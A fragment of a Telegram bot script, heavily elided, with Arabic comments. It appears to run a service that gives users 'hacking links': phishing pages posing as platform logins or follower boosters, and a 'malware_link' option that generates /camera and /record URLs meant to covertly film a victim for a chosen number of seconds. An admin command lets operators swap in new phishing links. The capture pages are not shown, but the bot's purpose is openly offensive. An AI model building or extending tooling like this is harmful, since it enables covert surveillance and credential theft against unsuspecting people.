...
bot.on('callback_query', (callbackQuery) => {
    ...
    if (data === 'malware_link') {
        ...
        const url = `${baseUrl}/camera?chatId=${chatId} `;
        ...
        bot.once('message', (msg) => {
            ...
            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
                const url = `${baseUrl}/record?chatId=${chatId}?duration=${duration}`;
...
// --- نظام إدارة روابط الصفحات المحدث (رابط منفصل لكل نوع) ---

// تخزين الروابط في الذاكرة مع فصل روابط تسجيل الدخول عن روابط زيادة المتابعين
let pageLinks = {
...
// دالة مساعدة لإرجاع اسم الصفحة بالعربية مع تحديد النوع
...
// أمر خاص للمشرفين لتغيير الروابط (/ee)
bot.onText(/\/ee/, async (msg) => {
    ...
    // إنشاء لوحة مفاتيح تحتوي على جميع المنصات مع تحديد النوع
    const keyboard = [
    ...
    // تقسيم الأزرار إلى أعمدة (زرين في كل صف)
...
bot.on('callback_query', async (query) => {
    ...
    // التحقق من صلاحية تعديل الروابط
    ...
    // ========== 1. معالج تعديل الروابط ==========
    if (data.startsWith('edit_link_')) {
        const fullPath = data.replace('edit_link_', '');
        let platform, type;
        
        // التحقق مما إذا كان الرابط يحتوي على نوع (login/increase)
    ...
    // ========== 2. معالج روابط الاختراق (للمستخدمين العاديين) ==========
...
bot.on('message', async (msg) => {
    ...
    if (allUsers[chatId] && allUsers[chatId].step === 'awaiting_new_link') {
        ...
        // تحديث الرابط حسب النوع
        if (type) {
            // إذا كان هناك نوع (login/increase)
